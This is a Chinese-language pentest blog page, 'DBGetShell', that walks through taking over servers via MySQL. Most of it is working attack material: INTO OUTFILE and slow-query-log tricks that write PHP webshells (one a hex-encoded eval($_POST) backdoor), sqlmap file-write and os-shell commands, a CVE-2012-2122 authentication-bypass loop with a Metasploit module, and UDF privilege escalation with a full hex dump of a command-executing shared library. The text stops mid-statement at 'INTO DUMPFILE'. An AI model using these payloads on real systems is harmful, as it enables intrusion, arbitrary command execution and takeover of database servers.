<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>DBGetShell | bo0s</title>
  <meta name="author" content="hitman">
  
  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="DBGetShell"/>
  <meta property="og:site_name" content="bo0s"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/12favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">bo0s</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="全部文章">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="标签">
			  <i class="fa fa-tag"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="我是谁.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/wiki/#/" title="WiKi.">
			  <i class="fa fa-book"></i>WiKi
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="工具">
			  <i class="fa fa-space-shuttle"></i>Tool
			</a>
		  </li>
		  
		  <li>
			<a href="/logs" title="日志">
			  <i class="fa fa-tachometer"></i>Logs
			</a>
		  </li>
		  
		  <li>
			<a href="/code/landing/" title="Discord.JS Bot Code">
			  <i class="fa fa-code"></i>Tutorials / Code
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> DBGetShell</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/images/SQLI.png" alt="upload successful"></p>
<blockquote>
<p>提权是为了收集更多信息来为更深一步渗透做准备，不是仅仅是为了提权而去提权.</p>
</blockquote>
<a id="more"></a> 

<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="Mysql-GetShell"><a href="#Mysql-GetShell" class="headerlink" title="Mysql GetShell"></a>Mysql GetShell</h2><h3 id="INTO-OUTFILE-Get-WebShell"><a href="#INTO-OUTFILE-Get-WebShell" class="headerlink" title="INTO OUTFILE Get WebShell"></a>INTO OUTFILE Get WebShell</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li><p>需要权限为<code>DBA</code>，拥有数据库root权限;</p>
</li>
<li><p>php的主动转义功能关闭，可以使用单双引号(<code>GPC</code>);</p>
</li>
<li><p>知道网站的<code>绝对路径</code>;</p>
</li>
<li><p><code>secure_file_priv</code> 无限制;</p>
</li>
</ul>
<blockquote>
<p>查询 <code>secure_file_priv</code> 是否存在限制</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#39;%secure_file_priv%&#39;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Mysql <code>5.5</code>之前 secure_file_priv 默认为<code>空</code>，这时可以像任意绝对路径写文件。</p>
<p>Mysql <code>5.5</code>之后secure_file_priv 默认为 <code>NULL</code>，这时不可写文件。</p>
<p>在Linux系统中权限分配较严格,一般情况下无法直接写入文件。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th>情况说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NULL</td>
<td>不允许导入导出</td>
</tr>
<tr>
<td align="left">/tmp</td>
<td>只允许在<code>/tmp</code>目录导入导出</td>
</tr>
<tr>
<td align="left">空</td>
<td>不限制目录</td>
</tr>
</tbody></table>
<blockquote>
<p>Write Shell</p>
</blockquote>
<blockquote>
<blockquote>
<p>手工 写 Shell</p>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 into outfile &#39;F:&#x2F;www&#x2F;info.php&#39; lines terminated by 0x3C3F70687020406576616C28245F504F53545B2767275D293B3F3E0D0A;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>Sqlmap 写 Shell</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap    -u &quot;https://target.com/id=*&quot; --file-write=&quot;/Users/Nobody/info.php&quot; --file-dest=&quot;/var/www/hrml/info.php&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>Sqlmap 获取 os-shell</p>
</blockquote>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://target.com/id=*&quot; --os-shell</span><br></pre></td></tr></table></figure>



<h3 id="慢日志写-WebShell"><a href="#慢日志写-WebShell" class="headerlink" title="慢日志写 WebShell"></a>慢日志写 WebShell</h3><ul>
<li>知道网站的<code>绝对路径</code>;</li>
<li>需要权限为<code>DBA</code>，拥有数据库root权限;</li>
<li><code>secure_file_priv</code> 无限制;</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE %slow<span class="emphasis">_query_</span>log%;</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line">| Variable<span class="emphasis">_name    | Value                           |</span></span><br><span class="line"><span class="emphasis">+------------------+---------------------------------+</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log   | OFF                             |</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log_</span>file | /var/lib/mysql/test.log             |</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br></pre></td></tr></table></figure>



<blockquote>
<p>开启日志记录</p>
</blockquote>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> global <span class="comment">show_query_log =</span> <span class="comment">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">set</span> global <span class="comment">show_query_log_file =</span> <span class="comment">&quot;/var/www/html/info.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>日志写入 Webshell</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;php? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>写入成功后通过刚才的日志 <code>SHOW VARIABLES LIKE %slow_query_log%;</code>结果恢复设置。</p>
<h3 id="身份认证绕过"><a href="#身份认证绕过" class="headerlink" title="身份认证绕过"></a>身份认证绕过</h3><blockquote>
<p>(CVE-2012-2122)受影响的版本包括:</p>
</blockquote>
<p>所有<code>MariaDB</code>和<code>MySQL</code>低于<code>5.1.61</code>,<code> 5.2.11</code>,<code>5.3.5</code>, <code>5.5.22</code>版本可用.<br>MariaDB <code>5.1.62</code>,<code> 5.2.12</code>,<code> 5.3.6</code>,<code> 5.5.23</code>版本不可用.<br>MySQL  <code>5.1.63</code>,<code> 5.5.24</code>,<code> 5.6.6</code> 版本不可用.</p>
<blockquote>
<p>利用方法：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux使用</span></span><br><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -uroot -proot -h 127.0.0.1 -P3306 ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSF也有对应的模块</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>



<h2 id="Mysql-提权"><a href="#Mysql-提权" class="headerlink" title="Mysql 提权"></a>Mysql 提权</h2><h3 id="UDP提权"><a href="#UDP提权" class="headerlink" title="UDP提权"></a>UDP提权</h3><blockquote>
<p>Use Defined Function 用户自定义函数，数据库功能的一种扩展，用户可通过自定义函数实现在<code>Mysql</code>中无法实现的功能，可以像<code>version()</code>一样的方便调用。需要将<code>UDF</code>文件上传到Mysql的目录中进行调用。</p>
</blockquote>
<blockquote>
<p>前提需要满足的条件:</p>
</blockquote>
<ul>
<li><code>secure_file_priv</code> 无限制，否则无法自定义导出位置</li>
<li><code>CREATE</code>、<code>FILE</code>等权限可用，<code>root</code>用户默认拥有全部权限</li>
<li><code>plugin</code>的值不为空(默认不为空)</li>
</ul>
<blockquote>
<p>查看<code>secure_file_priv</code>的值看是否允许导入导出文件：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%secure_file_priv%&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>查看当前数据库用户拥有的权限:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.user where user &#x3D; substring_index(user(), &#39;@&#39;, 1) ;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 查看<code>plugin</code>的值：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,plugin from mysql.user where user &#x3D; substring_index(user(),&#39;@&#39;,1);</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">| host      | user | plugin                |</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">| localhost | root | mysql_native_password |</span><br><span class="line">+-----------+------+-----------------------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取<code>plugin</code>的路径：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;%plugin%&#39;;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;lib&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>如果目录不存在的话</p>
<blockquote>
<blockquote>
<ul>
<li><p>Windows</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#39;x&#39; into dumpfile &#39;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;MySQL5.7.26&#x2F;lib::$INDEX_ALLOCATION&#39;;</span><br><span class="line">select &#39;x&#39; into dumpfile &#39;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;MySQL5.7.26&#x2F;lib&#x2F;plugin&#x2F;::$INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>Linux </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用WebShell创建目录。</span><br></pre></td></tr></table></figure>


</li>
</ul>
</blockquote>
</blockquote>
<blockquote>
<p>获取服务器版本信息确定UDF版本:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;version_compile_%&#39;;</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">| Variable_name           | Value    |</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">| version_compile_machine | x86_64   |</span><br><span class="line">| version_compile_os      | osx13.31 |</span><br><span class="line">+-------------------------+----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>写入动态链接库</p>
</blockquote>
<blockquote>
<blockquote>
<p>使用mysql一键梭哈:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/Nobody/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<blockquote>
<p>手工SELECT写入十六进制UDF文件，要确定版本再进行导入，这里以<code>lib_mysqludf_sys_64.so</code>来演示，当一个版本写入不成功可以再试试另一个版本.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE 